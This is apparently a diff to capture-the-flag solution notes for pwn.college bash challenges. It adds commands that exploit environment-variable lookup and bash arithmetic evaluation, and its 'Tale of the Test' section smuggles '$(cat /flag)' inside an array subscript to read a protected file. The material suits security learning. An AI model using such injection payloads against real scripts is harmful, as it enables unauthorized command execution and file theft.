@@ -216,6 +216,11 @@ $PROGRAM
 ```
 echo "cat /flag" > /tmp/tmp
 /challenge/run IFS . fortune
+
+OR
+
+echo "cat /flag" > =a && chmod +x =a
+/challenge/run PROGRAM=/home/hacker/ a fortune
 ```
 
 # Dance of the Delimiters
@@ -284,3 +289,30 @@ echo "cat /flag" > /tmp/tmp && chmod +x /tmp/tmp
 for in in {0..100}; do /challenge/run IFS 1 fortune; done | grep pwn
 ```
 temporary directory is created with '/tmp/tmpXXXXXXX' pattern, out of 100 attempts, one could be created with first X equal to '1'.
+
+# Tale of the Test
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+if [[ "$#" -ne 1 ]]
+then
+	echo "Usage: $0 SKILL_LEVEL"
+	exit 1
+fi
+
+if [[ "$1" -eq 1337 ]]
+then
+	echo "Not skilled enough!"
+	exit 2
+fi
+
+echo "You are quite skilled!"
+```
+
+### exploit
+```sh
+/challenge/run "a[\$(cat /flag)]"
+```
+TODO
